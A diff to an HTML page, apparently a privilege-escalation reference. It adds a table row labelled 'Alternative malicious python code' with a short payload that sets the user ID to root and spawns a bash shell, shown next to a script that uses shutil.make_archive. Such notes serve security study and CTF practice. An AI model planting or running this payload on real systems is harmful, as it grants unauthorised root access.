@@ -799,6 +799,12 @@ layout: default
                             <pre>&#13;&#10;#!/usr/bin/python3&#13;&#10;    (Removed irrelevant code)&#13;&#10;from shutil import make_archive&#13;&#10;   (Removed irrelevant code)&#13;&#10;&mldr;make_archive(dst, &apos;gztar&apos;, src)&#13;&#10;   (Removed irrelevant code)&#13;&#10;                            </pre>
                         </td>
                     </tr>
+                    <tr>
+                        <td>Alternative malicious python code</td>
+                        <td>
+                            <pre>import os&#13;&#10;import pty&#13;&#10;&#13;&#10;os.setuid(0)&#13;&#10;pty.spawn(&quot;bash&quot;)</pre>
+                        </td>
+                    </tr>
                 </table>
             </td>
         </tr>
